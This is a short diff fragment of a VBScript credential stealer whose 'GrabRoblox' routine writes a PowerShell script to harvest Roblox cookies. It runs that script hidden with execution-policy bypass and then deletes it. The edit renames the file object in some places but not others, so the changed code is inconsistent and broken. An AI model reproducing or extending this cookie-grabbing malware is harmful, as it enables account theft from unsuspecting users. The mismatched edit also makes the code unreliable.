@@ -197,7 +197,7 @@ Sub GrabRoblox()
     If fso.FileExists(psf) Then fso.DeleteFile psf, True
     If fso.FileExists(tf)  Then fso.DeleteFile tf,  True
 
-    Dim f : Set f = fso.CreateTextFile(psf, True, False)
+    Dim f2 : Set f2 = fso.CreateTextFile(psf, True, False)
 
     f.WriteLine "Add-Type -AssemblyName System.Security"
     f.WriteLine "$cookies = New-Object System.Collections.Generic.List[string]"
@@ -308,7 +308,7 @@ Sub GrabRoblox()
     f.WriteLine "if ($cookies.Count -gt 0) { $cookies | Out-File '" & TF & "' -Encoding utf8 }"
     f.WriteLine "else { 'NOT_FOUND' | Out-File '" & TF & "' -Encoding utf8 -NoNewline }"
 
-    f.Close : Set f = Nothing
+    f2.Close : Set f2 = Nothing
     sh.Run "cmd /c powershell -NoP -NonI -Exec Bypass -File """ & psf & """", 0, True
     If fso.FileExists(psf) Then fso.DeleteFile psf, True
     If Not fso.FileExists(tf) Then Exit Sub
